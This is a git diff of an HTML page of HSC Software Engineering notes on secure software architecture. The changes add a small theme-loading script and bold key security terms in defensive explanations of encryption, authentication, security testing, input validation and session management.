@@ -5,6 +5,8 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Secure Software Architecture | HSC Software Engineering</title>
   <meta name="description" content="Complete HSC Software Engineering notes on Secure Software Architecture — all NESA syllabus items covered including security by design, privacy by design, defensive coding, vulnerabilities, and ethical impacts." />
+  <!-- Theme init: prevents flash of wrong theme -->
+  <script>(function(){try{var t=localStorage.getItem('hsc-theme')||(window.matchMedia('(prefers-color-scheme: dark)').matches?'dark':'light');document.documentElement.setAttribute('data-theme',t);}catch(e){}})()</script>
   <link rel="stylesheet" href="../css/styles.css?v=3" />
 </head>
 <body>
@@ -125,7 +127,7 @@
           <p class="syllabus-concept">📌 <em><strong>Describe</strong> the benefits of developing secure software, including data protection and minimising cyber attacks and vulnerabilities.</em></p>
 
           <h3>Data Protection</h3>
-          <p>Secure software design ensures that personal, financial, and proprietary data is protected from unauthorised access, modification, or destruction throughout its entire lifecycle — whether at rest in a database, in transit across a network, or in active use. <strong>Data encryption</strong> (e.g., AES-256 for stored data, TLS 1.3 for data in transit) makes intercepted data unreadable to attackers. <strong>Access controls</strong> ensure only authorised users can retrieve sensitive records. In Australia, the <strong>Privacy Act 1988</strong> and its Australian Privacy Principles (APPs) impose legal obligations on organisations to protect personal information — failure results in significant financial penalties and mandatory breach notifications under the Notifiable Data Breaches (NDB) scheme. Beyond legal compliance, effective data protection builds user trust, which is increasingly a critical competitive advantage. A single publicised data breach can permanently destroy a brand's reputation and cause lasting customer attrition.</p>
+          <p>Secure software design ensures that personal, financial, and proprietary data is protected from unauthorised access, modification, or destruction throughout its entire lifecycle — whether at rest in a database, in transit across a network, or in active use. <strong>Data encryption</strong> (e.g., AES-256 for stored data, <strong>TLS</strong> 1.3 for data in transit) makes intercepted data unreadable to attackers. <strong>Access controls</strong> ensure only authorised users can retrieve sensitive records. In Australia, the <strong>Privacy Act 1988</strong> and its Australian Privacy Principles (APPs) impose legal obligations on organisations to protect personal information — failure results in significant financial penalties and mandatory breach notifications under the Notifiable Data Breaches (NDB) scheme. Beyond legal compliance, effective data protection builds user trust, which is increasingly a critical competitive advantage. A single publicised data breach can permanently destroy a brand's reputation and cause lasting customer attrition.</p>
 
           <h3>Minimising Cyber Attacks and Vulnerabilities</h3>
           <p>Every software vulnerability — an unintended weakness in code — represents a potential entry point for a cyber attacker. Proactively designing software to minimise vulnerabilities dramatically reduces the <strong>attack surface</strong>: the total number of possible ways an attacker could interact with or compromise a system. This is achieved through secure coding practices (input validation, parameterised queries, output encoding), regular security testing (SAST, DAST, penetration testing), and timely patching of dependencies. The economic impact of cyber attacks is severe: IBM's 2023 Cost of a Data Breach Report found the average breach cost AU$6.5 million — including incident response, legal fees, regulatory fines, and lost business. Secure software development converts this reactive, crisis-driven cost into a predictable, manageable investment in engineering quality. Additionally, minimising vulnerabilities reduces an organisation's exposure to reputational damage, intellectual property theft, and the operational disruption of ransomware attacks that can halt business operations entirely.</p>
@@ -151,28 +153,28 @@
               <div class="step-num">2</div>
               <div class="step-content">
                 <h4>📋 Determining Specifications</h4>
-                <p>Defining the precise technical boundaries, hardware constraints, and cryptographic protocols to be used (e.g., AES-256 for storage, TLS 1.3 for transit, bcrypt for password hashing). Specifications must include the maximum input lengths, permitted character sets, and data formats for every user-facing field. A <strong>Data Dictionary</strong> is created at this stage to define the exact size, format, type, and validation rules for every data field — for example, specifying that a password hash field stores exactly 60 characters in bcrypt format, preventing buffer overflow vulnerabilities from incorrectly sized fields.</p>
+                <p>Defining the precise technical boundaries, hardware constraints, and cryptographic protocols to be used (e.g., AES-256 for storage, <strong>TLS</strong> 1.3 for transit, bcrypt for password hashing). Specifications must include the maximum input lengths, permitted character sets, and data formats for every user-facing field. A <strong>Data Dictionary</strong> is created at this stage to define the exact size, format, type, and validation rules for every data field — for example, specifying that a password hash field stores exactly 60 characters in bcrypt format, preventing buffer overflow vulnerabilities from incorrectly sized fields.</p>
               </div>
             </div>
             <div class="step">
               <div class="step-num">3</div>
               <div class="step-content">
                 <h4>🎨 Design</h4>
-                <p>Creating the blueprint for the secure software architecture. This involves <strong>threat modelling</strong> — systematically identifying all possible attack vectors against the system using frameworks such as STRIDE (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege). The design phase applies "Security by Design" so security controls are built into the architecture, not bolted on afterward. For example, the authentication flow is designed to automatically lock an account after five failed attempts to prevent brute-force attacks. Tools: <strong>Data Flow Diagrams (DFDs)</strong> track how sensitive data moves between user, server, and database; <strong>Structure Charts</strong> map the hierarchy of secure modules; <strong>Decision Trees</strong> model complex authorisation logic.</p>
+                <p>Creating the blueprint for the secure software architecture. This involves <strong>threat modelling</strong> — systematically identifying all possible attack vectors against the system using frameworks such as STRIDE (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege). The design phase applies "Security by Design" so security controls are built into the architecture, not bolted on afterward. For example, the <strong>authentication</strong> flow is designed to automatically lock an account after five failed attempts to prevent brute-force attacks. Tools: <strong>Data Flow Diagrams (DFDs)</strong> track how sensitive data moves between user, server, and database; <strong>Structure Charts</strong> map the hierarchy of secure modules; <strong>Decision Trees</strong> model complex <strong>authorisation</strong> logic.</p>
               </div>
             </div>
             <div class="step">
               <div class="step-num">4</div>
               <div class="step-content">
                 <h4>💻 Development</h4>
-                <p>The coding phase where programmers apply defensive data input handling, input sanitisation, parameterised queries, and secure session management in every function that handles external data. Developers follow secure coding standards (e.g., OWASP Top 10 guidance) and use version control (Git) to track every change with a full audit trail. For example, all database queries use parameterised statements rather than string concatenation, completely eliminating SQL injection vulnerabilities. IDE debugging tools — breakpoints, watches, and single-line stepping — are used to trace the execution of security-critical logic.</p>
+                <p>The coding phase where programmers apply defensive data input handling, input sanitisation, parameterised queries, and secure session management in every function that handles external data. Developers follow secure coding standards (e.g., OWASP Top 10 guidance) and use version control (Git) to track every change with a full audit trail. For example, all database queries use parameterised statements rather than string concatenation, completely eliminating <strong>SQL injection</strong> vulnerabilities. IDE debugging tools — breakpoints, watches, and single-line stepping — are used to trace the execution of security-critical logic.</p>
               </div>
             </div>
             <div class="step">
               <div class="step-num">5</div>
               <div class="step-content">
                 <h4>🧩 Integration</h4>
-                <p>Combining isolated modules and connecting the software to external services safely. This phase ensures that internal microservices and third-party APIs exchange data securely — API keys must never appear in client-side code or version control history. For example, integrating a payment gateway (such as Stripe) uses OAuth 2.0 tokens so the main application never handles raw credit card numbers — liability and PCI-DSS scope are reduced significantly. CI/CD (Continuous Integration/Continuous Deployment) pipelines run automated security scans on every code merge to catch newly introduced vulnerabilities before they reach production.</p>
+                <p>Combining isolated modules and connecting the software to external services safely. This phase ensures that internal microservices and third-party APIs exchange data securely — API keys must never appear in client-side code or version control history. For example, integrating a payment gateway (such as Stripe) uses OAuth 2.0 tokens so the main application never handles raw credit card numbers — liability and PCI-DSS scope are reduced significantly. <strong>CI/CD</strong> (Continuous Integration/Continuous Deployment) pipelines run automated security scans on every code merge to catch newly introduced vulnerabilities before they reach production.</p>
               </div>
             </div>
             <div class="step">
@@ -265,11 +267,11 @@
           <div class="info-grid">
             <div class="info-card">
               <h4>🔰 Novice Users</h4>
-              <p>Users with low technical literacy require guided, intuitive security flows. If a password policy demands 16+ characters with special symbols but provides no password strength indicator, users will choose simple, guessable passwords or reuse passwords from other sites. Design response: embed real-time <strong>password strength meters</strong>, offer integration with password managers, and use biometric authentication (fingerprint, Face ID) to eliminate the password burden entirely where appropriate.</p>
+              <p>Users with low technical literacy require guided, intuitive security flows. If a password policy demands 16+ characters with special symbols but provides no password strength indicator, users will choose simple, guessable passwords or reuse passwords from other sites. Design response: embed real-time <strong>password strength meters</strong>, offer integration with password managers, and use biometric <strong>authentication</strong> (fingerprint, Face ID) to eliminate the password burden entirely where appropriate.</p>
             </div>
             <div class="info-card">
               <h4>🎓 Experienced Users</h4>
-              <p>Technical users may bypass restrictive security controls if they impede productivity — for example, using shared accounts to avoid repeated MFA prompts. Design response: offer <strong>trusted device registration</strong> (so MFA is only required on new devices), provide API token access for developers rather than forcing GUI logins, and support hardware security keys (FIDO2/WebAuthn) for the fastest and most secure authentication experience.</p>
+              <p>Technical users may bypass restrictive security controls if they impede productivity — for example, using shared accounts to avoid repeated MFA prompts. Design response: offer <strong>trusted device registration</strong> (so MFA is only required on new devices), provide API token access for developers rather than forcing GUI logins, and support hardware security keys (FIDO2/WebAuthn) for the fastest and most secure <strong>authentication</strong> experience.</p>
             </div>
             <div class="info-card">
               <h4>♿ Users with Disability</h4>
@@ -277,7 +279,7 @@
             </div>
             <div class="info-card">
               <h4>📱 Context of Use</h4>
-              <p>A user completing a mobile banking transaction in a noisy, public environment cannot safely respond to an SMS-based OTP if their phone screen is visible to bystanders. Engineers must consider the <strong>physical and social context</strong> in which security features are used — offering push notification authentication (tap to approve on a trusted device) rather than displaying a readable code on screen in high-risk public contexts.</p>
+              <p>A user completing a mobile banking transaction in a noisy, public environment cannot safely respond to an SMS-based OTP if their phone screen is visible to bystanders. Engineers must consider the <strong>physical and social context</strong> in which security features are used — offering push notification <strong>authentication</strong> (tap to approve on a trusted device) rather than displaying a readable code on screen in high-risk public contexts.</p>
             </div>
           </div>
 
@@ -303,7 +305,7 @@
           <div class="info-grid">
             <div class="info-card">
               <h4>🔒 Confidentiality</h4>
-              <p>Ensuring data is accessible only to authorised entities. <strong>Implementation:</strong> Data encryption (AES-256 at rest; TLS 1.3 in transit), role-based access control (RBAC), and data classification policies that restrict who can query which database tables. <strong>Example:</strong> Patient medical records in a hospital system are encrypted and accessible only to the treating clinician — even database administrators cannot view the plaintext content.</p>
+              <p>Ensuring data is accessible only to authorised entities. <strong>Implementation:</strong> Data <strong>encryption</strong> (AES-256 at rest; <strong>TLS</strong> 1.3 in transit), role-based access control (RBAC), and data classification policies that restrict who can query which database tables. <strong>Example:</strong> Patient medical records in a hospital system are encrypted and accessible only to the treating clinician — even database administrators cannot view the plaintext content.</p>
             </div>
             <div class="info-card">
               <h4>✅ Integrity</h4>
@@ -315,7 +317,7 @@
             </div>
             <div class="info-card">
               <h4>🪪 Authentication</h4>
-              <p>Verifying the identity of a user or system before granting access. <strong>Implementation:</strong> Password hashing (bcrypt with salt), Multi-Factor Authentication (MFA — something you know + something you have/are), biometrics, and hardware security keys. <strong>Example:</strong> A corporate VPN requires employees to enter their password and then approve a push notification on their registered smartphone — two independent factors that an attacker would need to compromise simultaneously.</p>
+              <p>Verifying the identity of a user or system before granting access. <strong>Implementation:</strong> Password hashing (bcrypt with salt), Multi-Factor <strong>Authentication</strong> (MFA — something you know + something you have/are), biometrics, and hardware security keys. <strong>Example:</strong> A corporate VPN requires employees to enter their password and then approve a push notification on their registered smartphone — two independent factors that an attacker would need to compromise simultaneously.</p>
             </div>
             <div class="info-card">
               <h4>🔑 Authorisation</h4>
@@ -332,7 +334,7 @@
             <h4>⚠️ Diagram - Risk Assessment</h4>
             <p class="diagram-subtitle">Identifying vulnerabilities through CIA framework</p>
             <p class="diagram-description">
-              This diagram maps security threats to fundamental security principles. The CIA Triad (Confidentiality, Integrity, Availability) plus Authentication and Accountability form the foundation of security assessment. Common threats like phishing, malware, and DoS attacks target specific aspects of this framework, helping identify where vulnerabilities and risks exist.
+              This diagram maps security threats to fundamental security principles. The CIA Triad (Confidentiality, Integrity, Availability) plus <strong>Authentication</strong> and Accountability form the foundation of security assessment. Common threats like phishing, malware, and DoS attacks target specific aspects of this framework, helping identify where vulnerabilities and risks exist.
             </p>
             <div class="mermaid">
               graph TB
@@ -398,8 +400,8 @@
           <p><strong>Cryptography</strong> is the practice of securing information by transforming it into an unreadable form for anyone who does not hold the decryption key. In security-by-design, cryptography is not an optional add-on — it is specified in the requirements phase and embedded in the architecture from the first line of code.</p>
 
           <div class="key-terms">
-            <div class="key-term-item"><strong>🔒 Symmetric Encryption</strong><span>The same key is used for both encryption and decryption (e.g., AES-256). Extremely fast — suited for encrypting large volumes of data at rest such as database fields, disk volumes, or file archives. The key distribution challenge (how do both parties safely share the same key?) is solved by asymmetric encryption.</span></div>
-            <div class="key-term-item"><strong>🔑 Asymmetric Encryption</strong><span>Uses a mathematically linked key pair — a <strong>public key</strong> (freely shared, used to encrypt) and a <strong>private key</strong> (secret, used to decrypt). RSA-2048 and ECC are common algorithms. Used in TLS handshakes to securely exchange a symmetric session key at the start of every HTTPS connection, and in digital signatures to verify identity.</span></div>
+            <div class="key-term-item"><strong>🔒 Symmetric Encryption</strong><span>The same key is used for both <strong>encryption</strong> and decryption (e.g., AES-256). Extremely fast — suited for encrypting large volumes of data at rest such as database fields, disk volumes, or file archives. The key distribution challenge (how do both parties safely share the same key?) is solved by asymmetric <strong>encryption</strong>.</span></div>
+            <div class="key-term-item"><strong>🔑 Asymmetric Encryption</strong><span>Uses a mathematically linked key pair — a <strong>public key</strong> (freely shared, used to encrypt) and a <strong>private key</strong> (secret, used to decrypt). RSA-2048 and ECC are common <strong>algorithms</strong>. Used in <strong>TLS</strong> handshakes to securely exchange a symmetric session key at the start of every <strong>HTTPS</strong> connection, and in digital signatures to verify identity.</span></div>
             <div class="key-term-item"><strong>#️⃣ Hashing</strong><span>A one-way mathematical function producing a fixed-length fingerprint (hash) of any input — impossible to reverse. SHA-256 produces a 64-character hex string. Used for password storage (bcrypt adds a random salt before hashing to prevent rainbow table attacks), verifying file integrity, and digital signatures.</span></div>
             <div class="key-term-item"><strong>✍️ Digital Signatures</strong><span>The sender hashes their message, then encrypts the hash with their private key — the result is the signature. The recipient decrypts it with the sender's public key and compares it to their own hash of the message. A match proves authenticity and integrity, providing non-repudiation.</span></div>
           </div>
@@ -462,7 +464,7 @@ STRIDE Threat Modelling Process
             <h4>🎯 Threat Model - Web Application</h4>
             <p class="diagram-subtitle">Identifying attack vectors in data flow</p>
             <p class="diagram-description">
-              This diagram shows common attack vectors at each stage of data flow in a web application: XSS in the browser, MITM attacks over the network, SQL injection at the database layer, and authentication bypass. Each threat is paired with concrete mitigation strategies to demonstrate defense-in-depth principles.
+              This diagram shows common attack vectors at each stage of data flow in a web application: <strong>XSS</strong> in the browser, MITM attacks over the network, <strong>SQL injection</strong> at the database layer, and <strong>authentication</strong> bypass. Each threat is paired with concrete mitigation strategies to demonstrate defense-in-depth principles.
             </p>
             <div class="mermaid">
               graph TB
@@ -499,7 +501,7 @@ STRIDE Threat Modelling Process
             <h4>🔐 Data Flow Diagram - Secure System (Level 0)</h4>
             <p class="diagram-subtitle">Security controls embedded in architecture</p>
             <p class="diagram-description">
-              This Level 0 Data Flow Diagram shows a secure system architecture with security controls integrated at each point: TLS encryption for network communication, OAuth for authentication, parameterized queries to prevent SQL injection, and audit logging for accountability. It demonstrates how security-by-design principles ensure data protection throughout the system.
+              This Level 0 Data Flow Diagram shows a secure system architecture with security controls integrated at each point: <strong>TLS</strong> <strong>encryption</strong> for network communication, OAuth for <strong>authentication</strong>, parameterized queries to prevent <strong>SQL injection</strong>, and audit logging for accountability. It demonstrates how security-by-design principles ensure data protection throughout the system.
             </p>
             <div class="mermaid">
               graph LR
@@ -535,7 +537,7 @@ STRIDE Threat Modelling Process
                 style ExtAPI fill:#E1BEE7,stroke:#7B1FA2,stroke-width:2px
             </div>
             <p class="diagram-caption">
-              <strong>Purpose:</strong> Model the secure data flow through a modern web system using Level 0 DFD notation. External Entities are external users/systems; Processes include all application components; Data Stores hold persistent data; Data Flows show movement with security controls (TLS, OAuth, encryption)<br>
+              <strong>Purpose:</strong> Model the secure data flow through a modern web system using Level 0 DFD notation. External Entities are external users/systems; Processes include all application components; Data Stores hold persistent data; Data Flows show movement with security controls (<strong>TLS</strong>, OAuth, <strong>encryption</strong>)<br>
               <strong>Syllabus Link:</strong> SE-12-02<br>
               <strong>Try This:</strong> Create a Level 0 DFD for a hospital patient management system, showing how patient records flow through the system with encrypted storage and access logs
             </p>
@@ -581,7 +583,7 @@ STRIDE Threat Modelling Process
           <p>Vulnerabilities must be identified before attackers find them. Engineers conduct <strong>vulnerability assessments</strong> — systematic scans of the application and its infrastructure to catalogue all known weaknesses (unpatched software, misconfigured services, exposed admin interfaces, default credentials). Vulnerability scanners (e.g., Nessus, OpenVAS) produce prioritised lists of findings rated by CVSS (Common Vulnerability Scoring System) severity. These findings are then remediated in priority order — critical vulnerabilities (CVSS 9.0–10.0) within 24 hours; high (7.0–8.9) within 7 days; medium within 30 days.</p>
 
           <h3>Hardening Systems</h3>
-          <p>System hardening reduces the attack surface by eliminating everything that is not strictly necessary for the system's function. A hardened production server has: all unnecessary network ports closed by firewall rules; all unused software packages, services, and user accounts removed; default passwords and credentials changed; logging enabled for all administrative actions; and automatic security updates configured. A hardened web application has: Content Security Policy (CSP) headers preventing unauthorised script execution; HTTP Strict Transport Security (HSTS) preventing protocol downgrade attacks; security headers (X-Frame-Options, X-Content-Type-Options) blocking clickjacking and MIME sniffing attacks.</p>
+          <p>System hardening reduces the attack surface by eliminating everything that is not strictly necessary for the system's function. A hardened production server has: all unnecessary network ports closed by firewall rules; all unused software packages, services, and user accounts removed; default passwords and credentials changed; logging enabled for all administrative actions; and automatic security updates configured. A hardened web application has: Content Security Policy (CSP) headers preventing unauthorised script execution; <strong>HTTP</strong> Strict Transport Security (HSTS) preventing protocol downgrade attacks; security headers (X-Frame-Options, X-Content-Type-Options) blocking clickjacking and MIME sniffing attacks.</p>
 
           <h3>Handling Breaches</h3>
           <p>An <strong>Incident Response Plan (IRP)</strong> defines the pre-agreed, structured process for managing a detected security breach: (1) <strong>Containment</strong> — immediately isolate affected systems to prevent lateral movement (e.g., take the compromised server offline, revoke compromised credentials). (2) <strong>Eradication</strong> — identify and remove the root cause (malware, backdoor, compromised account). (3) <strong>Recovery</strong> — restore systems from known-good backups and verify integrity before bringing them back online. (4) <strong>Post-Incident Review</strong> — document what happened, how it was detected, how long it took to contain, and what changes will prevent recurrence. Under Australia's NDB scheme, organisations must notify affected individuals and the Office of the Australian Information Commissioner (OAIC) within 30 days of becoming aware of an eligible breach.</p>
@@ -617,13 +619,13 @@ STRIDE Threat Modelling Process
                 </tr>
                 <tr>
                   <td><strong>SAST</strong> (Static Application Security Testing)</td>
-                  <td>Analyses source code, bytecode, or binaries without executing the program — scanning for known vulnerability patterns such as SQL injection, hardcoded credentials, and buffer overflows.</td>
-                  <td>Fast; can scan entire codebase in minutes. Integrates into CI/CD pipelines for automatic scanning on every code commit. No running application required.</td>
-                  <td>High false positive rate — flags many issues that are not actually exploitable. Cannot detect runtime-dependent vulnerabilities (e.g., authentication bypasses that depend on server state). Requires tuning to reduce noise.</td>
+                  <td>Analyses source code, bytecode, or binaries without executing the program — scanning for known vulnerability patterns such as <strong>SQL injection</strong>, hardcoded credentials, and buffer overflows.</td>
+                  <td>Fast; can scan entire codebase in minutes. Integrates into <strong>CI/CD</strong> pipelines for automatic scanning on every code commit. No running application required.</td>
+                  <td>High false positive rate — flags many issues that are not actually exploitable. Cannot detect runtime-dependent vulnerabilities (e.g., <strong>authentication</strong> bypasses that depend on server state). Requires tuning to reduce noise.</td>
                 </tr>
                 <tr>
                   <td><strong>DAST</strong> (Dynamic Application Security Testing)</td>
-                  <td>Attacks the running application from the outside — simulating how an external attacker would interact with it — sending malformed inputs, attempting injection attacks, and testing authentication flows.</td>
+                  <td>Attacks the running application from the outside — simulating how an external attacker would interact with it — sending malformed inputs, attempting injection attacks, and testing <strong>authentication</strong> flows.</td>
                   <td>Finds runtime vulnerabilities invisible to source code analysis. Tests the actual deployed configuration, not just the code. Lower false positive rate than SAST — if DAST finds it, it is real.</td>
                   <td>Requires a running application. Slower than SAST. Cannot see inside the application — may miss code paths that DAST probes don't reach. Can generate disruptive test traffic in production.</td>
                 </tr>
@@ -694,7 +696,7 @@ STRIDE Threat Modelling Process
 
           <!-- Security Testing Checklist -->
           <h3>Practical Security Testing Checklist</h3>
-          <p>The following table provides a practical checklist of security tests that developers should run at each stage of development. Many can be automated and integrated into CI/CD pipelines.</p>
+          <p>The following table provides a practical checklist of security tests that developers should run at each stage of development. Many can be automated and integrated into <strong>CI/CD</strong> pipelines.</p>
 
           <div class="table-wrap">
             <table>
@@ -710,8 +712,8 @@ STRIDE Threat Modelling Process
                 <tr>
                   <td><strong>Static Analysis</strong></td>
                   <td><code>bandit</code> (Python)</td>
-                  <td>Scans source code for common security issues: hardcoded passwords, use of weak cryptography, SQL injection patterns, insecure use of <code>eval()</code>, and subprocess injection.</td>
-                  <td>On every commit via CI/CD pipeline; before every pull request merge.</td>
+                  <td>Scans source code for common security issues: hardcoded passwords, use of weak cryptography, <strong>SQL injection</strong> patterns, insecure use of <code>eval()</code>, and subprocess injection.</td>
+                  <td>On every commit via <strong>CI/CD</strong> pipeline; before every pull request merge.</td>
                 </tr>
                 <tr>
                   <td><strong>Dependency Scanning</strong></td>
@@ -728,13 +730,13 @@ STRIDE Threat Modelling Process
                 <tr>
                   <td><strong>Authentication Testing</strong></td>
                   <td>Manual / Burp Suite</td>
-                  <td>Verifies that authentication controls enforce lockout after failed attempts, reject weak passwords, invalidate sessions on logout, and resist brute-force and credential-stuffing attacks.</td>
-                  <td>When authentication logic is modified; as part of pre-release security review.</td>
+                  <td>Verifies that <strong>authentication</strong> controls enforce lockout after failed attempts, reject weak passwords, invalidate sessions on logout, and resist brute-force and credential-stuffing attacks.</td>
+                  <td>When <strong>authentication</strong> logic is modified; as part of pre-release security review.</td>
                 </tr>
                 <tr>
                   <td><strong>Session Management Testing</strong></td>
                   <td>Manual / browser dev tools</td>
-                  <td>Checks that session tokens are sufficiently random, transmitted only over HTTPS, expire after inactivity, are invalidated on logout, and are not exposed in URLs or logs.</td>
+                  <td>Checks that session tokens are sufficiently random, transmitted only over <strong>HTTPS</strong>, expire after inactivity, are invalidated on logout, and are not exposed in URLs or logs.</td>
                   <td>When session handling code changes; before every production deployment.</td>
                 </tr>
               </tbody>
@@ -757,13 +759,13 @@ STRIDE Threat Modelling Process
           <p class="syllabus-concept">📌 <em><strong>Design, develop and implement</strong> code using defensive data input handling practices, including input validation, sanitisation, and error handling; and <strong>design, develop and implement</strong> a safe API to minimise software vulnerabilities.</em></p>
 
           <h3>Input Validation</h3>
-          <p>Input validation checks that all data received from external sources conforms to the expected format, type, length, and range before it is processed or stored. Validation must happen <strong>server-side</strong> — client-side validation is a UX convenience only; it can be bypassed by an attacker sending direct HTTP requests. Validation rules should be strict: if a field expects a 4-digit integer, reject anything that is not a 4-digit integer — including any string longer than 4 characters, any non-numeric character, and any value outside the permitted range.</p>
+          <p>Input validation checks that all data received from external sources conforms to the expected format, type, length, and range before it is processed or stored. Validation must happen <strong>server-side</strong> — client-side validation is a UX convenience only; it can be bypassed by an attacker sending direct <strong>HTTP</strong> requests. Validation rules should be strict: if a field expects a 4-digit integer, reject anything that is not a 4-digit integer — including any string longer than 4 characters, any non-numeric character, and any value outside the permitted range.</p>
 
           <h3>Sanitisation and Error Handling</h3>
           <p>Sanitisation transforms potentially malicious input into a safe form for use in the specific context where it will appear — HTML encoding for output in web pages, parameterised queries for database operations, path normalisation for file system operations. Error handling must never expose internal system details to the user — stack traces, database connection strings, server paths, or version information all provide attackers with a map of the system architecture.</p>
 
           <div class="callout exam-tip">
-            <strong>HSC Exam Tip:</strong> When asked about preventing SQL injection, always mention BOTH parameterised queries AND input validation — one protects the database, the other prevents bad data entering the system.
+            <strong>HSC Exam Tip:</strong> When asked about preventing <strong>SQL injection</strong>, always mention BOTH parameterised queries AND input validation — one protects the database, the other prevents bad data entering the system.
           </div>
 
           <div class="code-block">
@@ -839,7 +841,7 @@ logging.basicConfig(filename=<span class="str">'app.log'</span>, level=logging.E
           </div>
 
           <h3>Input Validation and Output Encoding</h3>
-          <p>Input validation rejects data that does not conform to a strict specification before it enters the system. Output encoding transforms data before it is rendered in a context (HTML, SQL, shell) so that special characters cannot be interpreted as instructions. Together they are the two-layer defence against injection and XSS attacks.</p>
+          <p>Input validation rejects data that does not conform to a strict specification before it enters the system. Output encoding transforms data before it is rendered in a context (HTML, SQL, shell) so that special characters cannot be interpreted as instructions. Together they are the two-layer defence against injection and <strong>XSS</strong> attacks.</p>
 
           <div class="code-block">
             <div class="code-header"><span class="code-lang">Python — Input Validation and Output Encoding</span></div>
@@ -878,9 +880,9 @@ print(encode_output(<span class="str">"&lt;script&gt;alert('xss')&lt;/script&gt;
           <p>An API (Application Programming Interface) that is insecurely designed is one of the most common and dangerous attack surfaces in modern software. A safe API enforces multiple protective layers:</p>
 
           <div class="key-terms">
-            <div class="key-term-item"><strong>🪙 Authentication Tokens</strong><span>Every API request must present a valid authentication token (e.g., JWT Bearer token or API key in the Authorization header). Unauthenticated requests are rejected with HTTP 401 Unauthorized before any processing occurs. Tokens must be short-lived (15–60 minutes for JWTs) and refreshed using secure refresh token flows.</span></div>
-            <div class="key-term-item"><strong>🚦 Rate Limiting</strong><span>Limits the number of requests a client can make per time window (e.g., 100 requests per minute per API key). Prevents brute-force attacks on authentication endpoints, data scraping, and denial-of-service through resource exhaustion. Exceeding the limit returns HTTP 429 Too Many Requests.</span></div>
-            <div class="key-term-item"><strong>🔐 HTTPS Only</strong><span>All API communication must be over HTTPS — never HTTP. Even internal microservice-to-microservice communication should use mutual TLS (mTLS) to prevent man-in-the-middle attacks within a network perimeter.</span></div>
+            <div class="key-term-item"><strong>🪙 Authentication Tokens</strong><span>Every API request must present a valid <strong>authentication</strong> token (e.g., <strong>JWT</strong> Bearer token or API key in the <strong>Authorization</strong> header). Unauthenticated requests are rejected with <strong>HTTP</strong> 401 Unauthorized before any processing occurs. Tokens must be short-lived (15–60 minutes for JWTs) and refreshed using secure refresh token flows.</span></div>
+            <div class="key-term-item"><strong>🚦 Rate Limiting</strong><span>Limits the number of requests a client can make per time window (e.g., 100 requests per minute per API key). Prevents brute-force attacks on <strong>authentication</strong> endpoints, data scraping, and denial-of-service through resource exhaustion. Exceeding the limit returns <strong>HTTP</strong> 429 Too Many Requests.</span></div>
+            <div class="key-term-item"><strong>🔐 HTTPS Only</strong><span>All API communication must be over <strong>HTTPS</strong> — never <strong>HTTP</strong>. Even internal microservice-to-microservice communication should use mutual <strong>TLS</strong> (mTLS) to prevent man-in-the-middle attacks within a network perimeter.</span></div>
             <div class="key-term-item"><strong>📋 Input Validation on Every Endpoint</strong><span>Every API endpoint must independently validate and sanitise all inputs — it cannot trust that a calling service has already validated the data. APIs are often called directly by attackers bypassing any client-side validation entirely.</span></div>
             <div class="key-term-item"><strong>🔒 Least Privilege Scopes</strong><span>OAuth 2.0 scopes restrict what each token is authorised to do. A token issued for reading user profile data should not permit writing or deleting data. Separate tokens with minimal scopes for each integration reduce the blast radius of any compromised token.</span></div>
           </div>
@@ -914,13 +916,13 @@ print(encode_output(<span class="str">"&lt;script&gt;alert('xss')&lt;/script&gt;
           </div>
 
           <h3>Session Management</h3>
-          <p><strong>Session management</strong> controls how the server tracks authenticated users across multiple HTTP requests — since HTTP is stateless, each request must carry proof of identity. Insecure session management is consistently listed in the OWASP Top 10 most critical web vulnerabilities. Secure session management practices:</p>
+          <p><strong>Session management</strong> controls how the server tracks authenticated users across multiple <strong>HTTP</strong> requests — since <strong>HTTP</strong> is stateless, each request must carry proof of identity. Insecure session management is consistently listed in the OWASP Top 10 most critical web vulnerabilities. Secure session management practices:</p>
 
           <div class="key-terms">
             <div class="key-term-item"><strong>🎲 Cryptographically Random Session IDs</strong><span>Session tokens must be generated using a cryptographically secure random number generator — not sequential integers or predictable patterns. A predictable session ID can be guessed by an attacker who has observed one valid session ID.</span></div>
-            <div class="key-term-item"><strong>🍪 Secure Cookie Attributes</strong><span>Session cookies must have: <code>HttpOnly</code> (prevents JavaScript from reading the cookie, blocking XSS-based session theft); <code>Secure</code> (cookie is only sent over HTTPS, never HTTP); <code>SameSite=Strict</code> (prevents the cookie being sent in cross-site requests, blocking CSRF); and a short <code>Max-Age</code> (auto-expire idle sessions).</span></div>
+            <div class="key-term-item"><strong>🍪 Secure Cookie Attributes</strong><span>Session cookies must have: <code>HttpOnly</code> (prevents JavaScript from reading the cookie, blocking <strong>XSS</strong>-based session theft); <code>Secure</code> (cookie is only sent over <strong>HTTPS</strong>, never <strong>HTTP</strong>); <code>SameSite=Strict</code> (prevents the cookie being sent in cross-site requests, blocking CSRF); and a short <code>Max-Age</code> (auto-expire idle sessions).</span></div>
             <div class="key-term-item"><strong>⏱️ Session Expiry</strong><span>Sessions must expire automatically after a defined period of inactivity (e.g., 15–30 minutes for sensitive applications, 24 hours for lower-risk applications). Upon logout, the session token must be immediately invalidated on the server — deleting it from the client alone is insufficient, as a copy of the token may have been stolen.</span></div>
-            <div class="key-term-item"><strong>🔄 Session Regeneration</strong><span>After a successful login, a new session ID must be issued — invalidating any pre-authentication session. This prevents session fixation attacks, where an attacker tricks a victim into using an attacker-controlled session ID before they log in.</span></div>
+            <div class="key-term-item"><strong>🔄 Session Regeneration</strong><span>After a successful login, a new session ID must be issued — invalidating any pre-<strong>authentication</strong> session. This prevents session fixation attacks, where an attacker tricks a victim into using an attacker-controlled session ID before they log in.</span></div>
           </div>
 
           <h3>Exception Management</h3>
@@ -936,7 +938,7 @@ print(encode_output(<span class="str">"&lt;script&gt;alert('xss')&lt;/script&gt;
           <p class="syllabus-concept">📌 <em><strong>Design, develop and implement</strong> secure code to minimise vulnerabilities in user action controls, including broken authentication, XSS, CSRF, invalid forwarding and redirecting, and race conditions.</em></p>
 
           <div class="key-terms">
